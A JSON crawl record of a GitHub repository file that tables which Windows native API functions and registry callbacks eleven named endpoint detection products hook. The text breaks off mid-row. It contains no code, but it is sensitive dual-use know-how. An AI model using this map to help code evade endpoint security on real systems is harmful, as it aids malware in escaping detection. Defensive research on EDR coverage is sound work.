{
  "metadata": {
    "timestamp": 1736710026542,
    "page": 635,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjY0MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "Mr-Un1k0d3r/EDRs",
      "stars": 2032,
      "defaultBranch": "main",
      "files": [
        {
          "name": "EDRs.md",
          "type": "blob",
          "size": 32.396484375,
          "content": "| EDR/API                                  | attivo | sentinelone | cortex | sophos | mcafee | crowdstrike | morphisec | cylance | deepinstinct | carbonblack | symantec |\n|------------------------------------------|--------|-------------|--------|--------|--------|-------------|-----------|---------|--------------|-------------|----------|\n| KiUserApcDispatcher                      | FALSE  | TRUE        | FALSE  | TRUE   | FALSE  | FALSE       | TRUE      | FALSE   | FALSE        | FALSE       | FALSE    |\n| KiUserExceptionDispatcher                | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | TRUE      | FALSE   | FALSE        | FALSE       | FALSE    |\n| LdrFindEntryForAddress                   | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | TRUE      | FALSE   | FALSE        | FALSE       | FALSE    |\n| LdrLoadDll                               | FALSE  | TRUE        | FALSE  | TRUE   | TRUE   | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| LdrOpenImageFileOptionsKey               | TRUE   | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| LdrResolveDelayLoadedAPI                 | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | TRUE      | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtAddBootEntry                           | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtAdjustPrivilegesToken                  | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtAlertResumeThread                      | FALSE  | FALSE       | FALSE  | FALSE  | TRUE   | FALSE       | FALSE     | FALSE   | TRUE         | FALSE       | FALSE    |\n| NtAllocateVirtualMemory                  | FALSE  | TRUE        | TRUE   | TRUE   | FALSE  | TRUE        | FALSE     | TRUE    | FALSE        | TRUE        | FALSE    |\n| NtAllocateVirtualMemoryEx                | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtAlpcConnectPort                        | FALSE  | FALSE       | FALSE  | TRUE   | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtAreMappedFilesTheSame                  | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | TRUE      | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtClose                                  | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | TRUE         | TRUE        | FALSE    |\n| NtCreateFile                             | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | TRUE        | TRUE     |\n| NtCreateKey                              | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| NtCreateMutant                           | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtCreateProcess                          | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | TRUE    | TRUE         | FALSE       | FALSE    |\n| NtCreateProcessEx                        | TRUE   | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | TRUE    | TRUE         | FALSE       | FALSE    |\n| NtCreateSection                          | TRUE   | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | TRUE         | FALSE       | FALSE    |\n| NtCreateThread                           | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | TRUE    | FALSE        | TRUE        | FALSE    |\n| NtCreateThreadEx                         | FALSE  | TRUE        | FALSE  | FALSE  | TRUE   | FALSE       | FALSE     | TRUE    | TRUE         | TRUE        | FALSE    |\n| NtCreateUserProcess                      | FALSE  | TRUE        | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | TRUE    | FALSE        | FALSE       | TRUE     |\n| NtDelayExecution                         | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtDeleteBootEntry                        | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtDeleteFile                             | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| NtDeleteKey                              | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| NtDeleteValueKey                         | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| NtDeviceIoControlFile                    | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtDuplicateObject                        | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | TRUE         | FALSE       | FALSE    |\n| NtFreeVirtualMemory                      | FALSE  | TRUE        | FALSE  | TRUE   | FALSE  | FALSE       | FALSE     | TRUE    | FALSE        | FALSE       | FALSE    |\n| NtGdiBitBlt                              | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtGetContextThread                       | FALSE  | FALSE       | FALSE  | FALSE  | TRUE   | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtLoadDriver                             | FALSE  | TRUE        | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtMapUserPhysicalPages                   | FALSE  | TRUE        | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtMapViewOfSection                       | FALSE  | TRUE        | TRUE   | TRUE   | TRUE   | TRUE        | TRUE      | TRUE    | TRUE         | TRUE        | TRUE     |\n| NtMapViewOfSectionEx                     | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtModifyBootEntry                        | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtOpenCreateFile                         | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtOpenFile                               | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| NtOpenKey                                | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| NtOpenKeyEx                              | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| NtOpenProcess                            | TRUE   | TRUE        | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | TRUE        | FALSE    |\n| NtOpenProcessToken                       | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtOpenProcessTokenEx                     | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtOpenThreadToken                        | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtOpenThreadTokenEx                      | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtProtectVirtualMemory                   | TRUE   | TRUE        | TRUE   | TRUE   | FALSE  | TRUE        | FALSE     | TRUE    | FALSE        | TRUE        | FALSE    |\n| NtQueryAttributesFile                    | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | TRUE      | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtQueryFullAttributesFile                | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | TRUE      | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtQueryInformationProcess                | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | TRUE        | FALSE    |\n| NtQueryInformationThread                 | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtQueryInformationTokenTokenUser         | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtQuerySystemInformation                 | FALSE  | TRUE        | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | TRUE        | FALSE    |\n| NtQuerySystemInformationEx               | FALSE  | TRUE        | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtQueryVirtualMemory                     | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | TRUE      | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtQueueApcThread                         | FALSE  | TRUE        | TRUE   | TRUE   | TRUE   | TRUE        | TRUE      | TRUE    | TRUE         | TRUE        | FALSE    |\n| NtQueueApcThreadEx                       | FALSE  | TRUE        | TRUE   | FALSE  | FALSE  | TRUE        | FALSE     | TRUE    | FALSE        | TRUE        | FALSE    |\n| NtQueueApcThreadEx2                      | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtReadVirtualMemory                      | TRUE   | TRUE        | TRUE   | TRUE   | FALSE  | TRUE        | FALSE     | TRUE    | FALSE        | TRUE        | FALSE    |\n| NtRenameKey                              | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| NtResumeThread                           | FALSE  | TRUE        | FALSE  | FALSE  | TRUE   | TRUE        | FALSE     | FALSE   | TRUE         | FALSE       | FALSE    |\n| NtSetContextThread                       | FALSE  | TRUE        | TRUE   | TRUE   | TRUE   | TRUE        | FALSE     | FALSE   | TRUE         | FALSE       | FALSE    |\n| NtSetInformationFile                     | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| NtSetInformationProcess                  | FALSE  | TRUE        | TRUE   | FALSE  | FALSE  | TRUE        | FALSE     | TRUE    | FALSE        | FALSE       | FALSE    |\n| NtSetInformationProcessCriticalProcess   | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtSetInformationThread                   | FALSE  | TRUE        | FALSE  | FALSE  | FALSE  | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtSetInformationThreadCriticalThread     | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtSetInformationThreadHideFromDebugger   | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtSetInformationThreadImpersonationToken | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtSetInformationThreadWow64Context       | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtSetInformationVirtualMemory            | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtSetValueKey                            | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| NtSuspendThread                          | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtSystemDebugControl                     | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtTerminateProcess                       | TRUE   | TRUE        | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| NtTerminateThread                        | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| NtUnmapViewOfSection                     | FALSE  | TRUE        | TRUE   | TRUE   | TRUE   | TRUE        | FALSE     | TRUE    | FALSE        | TRUE        | FALSE    |\n| NtUnmapViewOfSectionEx                   | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtUserGetAsyncKeyState                   | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtUserGetClipboardData                   | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtUserSetWindowsHookEx                   | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| NtWriteFile                              | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | TRUE        | FALSE    |\n| NtWriteVirtualMemory                     | TRUE   | TRUE        | TRUE   | TRUE   | TRUE   | TRUE        | FALSE     | TRUE    | TRUE         | TRUE        | FALSE    |\n| RegNtCallbackObjectContextCleanup        | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostCreateKey                       | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostCreateKeyEx                     | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostDeleteKey                       | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostDeleteValueKey                  | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostEnumerateKey                    | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostEnumerateValueKey               | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostFlushKey                        | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostKeyHandleClose                  | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostLoadKey                         | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostOpenKey                         | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostOpenKeyEx                       | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostQueryKey                        | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostQueryKeyName                    | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostQueryKeySecurity                | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostQueryMultipleValueKey           | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostQueryValueKey                   | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostRenameKey                       | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostReplaceKey                      | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostRestoreKey                      | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostSaveKey                         | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostSetInformationKey               | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostSetKeySecurity                  | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostSetValueKey                     | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPostUnLoadKey                       | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreCreateKey                        | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreCreateKeyEx                      | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreDeleteKey                        | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreDeleteValueKey                   | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreEnumerateKey                     | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreEnumerateValueKey                | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreFlushKey                         | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreKeyHandleClose                   | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreLoadKey                          | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreOpenKey                          | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreOpenKeyEx                        | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreQueryKey                         | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreQueryKeyName                     | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreQueryKeySecurity                 | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreQueryMultipleValueKey            | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreQueryValueKey                    | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreRenameKey                        | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreReplaceKey                       | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreRestoreKey                       | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreSaveKey                          | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreSetInformationKey                | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreSetKeySecurity                   | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreSetValueKey                      | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RegNtPreUnLoadKey                        | FALSE  | FALSE       | TRUE   | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RtlAddVectoredExceptionHandler           | FALSE  | TRUE        | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RtlCreateUserThread                      | FALSE  | FALSE       | FALSE  | FALSE  | TRUE   | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| RtlDosApplyFileIsolationRedirection_Ustr | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | TRUE      | FALSE   | FALSE        | FALSE       | FALSE    |\n| RtlGetNativeSystemInformation            | FALSE  | TRUE        | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | TRUE        | FALSE    |\n| RtlInstallFunctionTableCallback          | FALSE  | FALSE       | FALSE  | TRUE   | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwAlertResumeThread                      | FALSE  | FALSE       | FALSE  | FALSE  | TRUE   | FALSE       | FALSE     | FALSE   | TRUE         | FALSE       | FALSE    |\n| ZwAllocateVirtualMemory                  | FALSE  | TRUE        | FALSE  | TRUE   | FALSE  | TRUE        | FALSE     | TRUE    | FALSE        | TRUE        | FALSE    |\n| ZwAllocateVirtualMemoryEx                | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwAlpcConnectPort                        | FALSE  | FALSE       | FALSE  | TRUE   | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwAreMappedFilesTheSame                  | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | TRUE      | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwClose                                  | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | TRUE         | TRUE        | FALSE    |\n| ZwCreateFile                             | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | TRUE        | TRUE     |\n| ZwCreateKey                              | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| ZwCreateProcess                          | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | TRUE    | TRUE         | FALSE       | FALSE    |\n| ZwCreateProcessEx                        | TRUE   | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | TRUE    | TRUE         | FALSE       | FALSE    |\n| ZwCreateSection                          | TRUE   | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | TRUE         | FALSE       | FALSE    |\n| ZwCreateThread                           | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | TRUE    | FALSE        | TRUE        | FALSE    |\n| ZwCreateThreadEx                         | FALSE  | TRUE        | FALSE  | FALSE  | TRUE   | FALSE       | FALSE     | TRUE    | TRUE         | TRUE        | FALSE    |\n| ZwCreateUserProcess                      | FALSE  | TRUE        | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | TRUE    | FALSE        | FALSE       | TRUE     |\n| ZwDeleteFile                             | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| ZwDeleteKey                              | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| ZwDeleteValueKey                         | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| ZwDeviceIoControlFile                    | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwDuplicateObject                        | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | TRUE         | FALSE       | FALSE    |\n| ZwFreeVirtualMemory                      | FALSE  | TRUE        | FALSE  | TRUE   | FALSE  | FALSE       | FALSE     | TRUE    | FALSE        | FALSE       | FALSE    |\n| ZwGetContextThread                       | FALSE  | FALSE       | FALSE  | FALSE  | TRUE   | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwLoadDriver                             | FALSE  | TRUE        | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwMapUserPhysicalPages                   | FALSE  | TRUE        | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwMapViewOfSection                       | FALSE  | TRUE        | FALSE  | TRUE   | TRUE   | TRUE        | TRUE      | TRUE    | TRUE         | TRUE        | TRUE     |\n| ZwMapViewOfSectionEx                     | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwOpenFile                               | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| ZwOpenKey                                | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| ZwOpenKeyEx                              | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| ZwOpenProcess                            | TRUE   | TRUE        | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | TRUE        | FALSE    |\n| ZwProtectVirtualMemory                   | TRUE   | TRUE        | FALSE  | TRUE   | FALSE  | TRUE        | FALSE     | TRUE    | FALSE        | TRUE        | FALSE    |\n| ZwQueryAttributesFile                    | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | TRUE      | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwQueryFullAttributesFile                | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | TRUE      | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwQueryInformationProcess                | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | TRUE        | FALSE    |\n| ZwQueryInformationThread                 | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwQuerySystemInformation                 | FALSE  | TRUE        | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | TRUE        | FALSE    |\n| ZwQuerySystemInformationEx               | FALSE  | TRUE        | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwQueryVirtualMemory                     | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | TRUE      | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwQueueApcThread                         | FALSE  | TRUE        | FALSE  | TRUE   | TRUE   | TRUE        | TRUE      | TRUE    | TRUE         | TRUE        | FALSE    